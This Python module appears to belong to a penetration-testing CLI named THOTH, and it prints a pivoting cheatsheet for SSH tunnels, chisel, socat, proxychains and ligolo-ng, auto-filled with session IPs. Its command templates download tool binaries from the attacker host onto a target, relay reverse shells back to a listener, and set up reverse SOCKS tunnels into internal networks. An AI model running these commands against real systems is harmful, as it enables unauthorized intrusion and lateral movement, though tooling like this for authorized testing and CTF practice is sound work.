"""
THOTH — Network Pivoting Guide
Interactive cheatsheet for tunneling, port forwarding,
chisel, socat, ssh tunneling — auto-filled with session IPs.
"""

import re, subprocess
from core.colors import c, C, header, ok, err, info, warn
from core import db

TECHNIQUES = {
    "SSH Tunneling": {
        "icon": "ssh",
        "desc": "Built-in, no tools needed. Works on most Linux targets.",
        "sections": [
            {
                "title": "Local port forward (access target service locally)",
                "cmd":   "ssh -L {lport}:{target}:{rport} user@{target}",
                "note":  "Access target's port {rport} via localhost:{lport} on your machine",
            },
            {
                "title": "Remote port forward (expose your service to target)",
                "cmd":   "ssh -R {rport}:localhost:{lport} user@{target}",
                "note":  "Target can reach your local port {lport} via their localhost:{rport}",
            },
            {
                "title": "Dynamic SOCKS proxy (route all traffic through target)",
                "cmd":   "ssh -D 1080 user@{target}",
                "note":  "Use with proxychains — edit /etc/proxychains.conf: socks5 127.0.0.1 1080",
            },
            {
                "title": "SSH pivoting through target to internal host",
                "cmd":   "ssh -J user@{target} user2@{internal}",
                "note":  "Jump through {target} to reach {internal} — requires SSH on both",
            },
        ]
    },
    "Chisel": {
        "icon": "chisel",
        "desc": "Fast TCP tunnel over HTTP. Best tool for CTF pivoting.",
        "sections": [
            {
                "title": "Server on your Kali (attacker side)",
                "cmd":   "chisel server --port 8080 --reverse",
                "note":  "Run this on YOUR machine first, then connect from target",
            },
            {
                "title": "Client on target — reverse SOCKS proxy",
                "cmd":   "chisel client {lhost}:8080 R:socks",
                "note":  "Run on TARGET — creates SOCKS5 proxy on your Kali port 1080",
            },
            {
                "title": "Client on target — forward specific port",
                "cmd":   "chisel client {lhost}:8080 R:{lport}:{internal}:{rport}",
                "note":  "Forward internal:{rport} to your Kali localhost:{lport}",
            },
            {
                "title": "Transfer chisel to target",
                "cmd":   "# On Kali:\npython3 -m http.server 80\n# On target:\nwget http://{lhost}/chisel -O /tmp/chisel && chmod +x /tmp/chisel",
                "note":  "Download chisel binary to target — get it from github.com/jpillora/chisel/releases",
            },
        ]
    },
    "Socat": {
        "icon": "socat",
        "desc": "Swiss army knife for port forwarding. Usually pre-installed.",
        "sections": [
            {
                "title": "Simple port forward on target",
                "cmd":   "socat TCP-LISTEN:{rport},fork TCP:{internal}:{iport}",
                "note":  "On TARGET — forward connections to target:{rport} → internal:{iport}",
            },
            {
                "title": "Transfer socat static binary to target",
                "cmd":   "wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat && chmod +x /tmp/socat",
                "note":  "If socat not installed — use static binary",
            },
            {
                "title": "Reverse shell relay through target",
                "cmd":   "socat TCP-LISTEN:{rport},fork TCP:{lhost}:{lport}",
                "note":  "Relay shells from internal hosts back to your listener",
            },
        ]
    },
    "Proxychains": {
        "icon": "proxy",
        "desc": "Route any tool's traffic through a SOCKS proxy.",
        "sections": [
            {
                "title": "Configure proxychains",
                "cmd":   "# Edit /etc/proxychains.conf\n# Add at bottom:\nsocks5 127.0.0.1 1080",
                "note":  "Works with chisel R:socks or ssh -D 1080",
            },
            {
                "title": "Use any tool through the pivot",
                "cmd":   "proxychains nmap -sT -p 80,443,22 {internal}\nproxychains curl http://{internal}\nproxychains ssh user@{internal}",
                "note":  "Use -sT (TCP connect) with nmap — SYN scan does not work through proxy",
            },
            {
                "title": "Run full scan through pivot",
                "cmd":   "proxychains nmap -sT -Pn -p- --min-rate 1000 {internal}",
                "note":  "Slow but thorough — -Pn needed since ICMP won't work through proxy",
            },
        ]
    },
    "Ligolo-ng": {
        "icon": "ligolo",
        "desc": "Modern tunneling — creates a TUN interface. Feels like native routing.",
        "sections": [
            {
                "title": "Start proxy on Kali",
                "cmd":   "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601",
                "note":  "Creates tun interface — traffic routes natively",
            },
            {
                "title": "Run agent on target",
                "cmd":   "./agent -connect {lhost}:11601 -ignore-cert",
                "note":  "Connect agent from target back to your proxy",
            },
            {
                "title": "Add route and start tunnel",
                "cmd":   "# In ligolo-ng console:\nsession\nifconfig\n# Add route on Kali:\nsudo ip route add {internal_subnet}/24 dev ligolo\n# Start tunnel:\nstart",
                "note":  "After this you can reach internal hosts directly — no proxychains needed",
            },
        ]
    },
}

# ── VPN IP detection ──
def _get_vpn_ip():
    try:
        result = subprocess.run(
            ["ip","addr","show","tun0"],
            capture_output=True, text=True, timeout=5
        )
        m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
        if m: return m.group(1)
    except: pass
    # Fallback: try tun1
    try:
        result = subprocess.run(
            ["ip","addr","show","tun1"],
            capture_output=True, text=True, timeout=5
        )
        m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
        if m: return m.group(1)
    except: pass
    return None

def _fill(template, lhost, target, lport="4444", rport="80",
          internal="<internal-ip>", iport="80"):
    return (template
        .replace("{lhost}",   lhost   or "<your-tun0-ip>")
        .replace("{target}",  target  or "<target-ip>")
        .replace("{lport}",   lport)
        .replace("{rport}",   rport)
        .replace("{internal}",internal)
        .replace("{iport}",   iport)
        .replace("{internal_subnet}","<internal-subnet>")
    )

def cmd_pivot(args):
    s      = db.get_active()
    target = s["target"] if s else None
    lhost  = _get_vpn_ip()

    # Detect internal IP from args
    internal = None
    if "--internal" in args:
        idx = args.index("--internal")
        if idx+1 < len(args): internal = args[idx+1]

    # Specific technique
    technique = None
    for a in args:
        for k in TECHNIQUES:
            if a.lower() in k.lower() or k.lower().startswith(a.lower()):
                technique = k
                break

    header("Network Pivoting Guide")
    print()

    # Show VPN + target info
    if lhost:
        ok(f"VPN IP detected  : {lhost}  (tun0)")
    else:
        warn("VPN IP not detected — connect to VPN first")
        lhost = "<your-tun0-ip>"

    if target:
        info(f"Target           : {target}")
    else:
        info("No active session — commands will use placeholders")
        target = "<target-ip>"

    if internal:
        info(f"Internal target  : {internal}")
    else:
        internal = "<internal-ip>"

    print()

    # Show all techniques or one specific
    techs_to_show = {technique: TECHNIQUES[technique]} if technique else TECHNIQUES

    for name, tech in techs_to_show.items():
        # Section header
        print("  " + c(C.BOLD+C.CYAN_L, f"◈  {name}"))
        print("  " + c(C.GRAY, tech["desc"]))
        print("  " + c(C.GRAY, "─"*52))
        print()

        for section in tech["sections"]:
            print("  " + c(C.BOLD+C.WHITE, section["title"]))
            # Multi-line command
            for line in section["cmd"].splitlines():
                if line.startswith("#"):
                    print("    " + c(C.GRAY, line))
                else:
                    filled = _fill(line, lhost, target, internal=internal)
                    print("    " + c(C.CYAN_L, filled))
            print("  " + c(C.GRAY, "  → " + section["note"]
                            .replace("{lhost}", lhost)
                            .replace("{target}", target)
                            .replace("{internal}", internal)))
            print()

        if not technique:
            print()

    # Usage tips
    if not technique:
        print("  " + c(C.GRAY, "─"*52))
        print()
        print(c(C.GRAY, "  Show one technique:"))
        for name in TECHNIQUES:
            cmd_name = name.lower().split()[0]
            print(c(C.GRAY,"    thoth pivot ") + c(C.WHITE, cmd_name))
        print()
        print(c(C.GRAY,"  Set internal IP:"))
        print(c(C.GRAY,"    thoth pivot --internal ") + c(C.WHITE,"172.16.1.50"))
        print()

    if s:
        db.log_add(s["name"], "pivot", technique or "all")
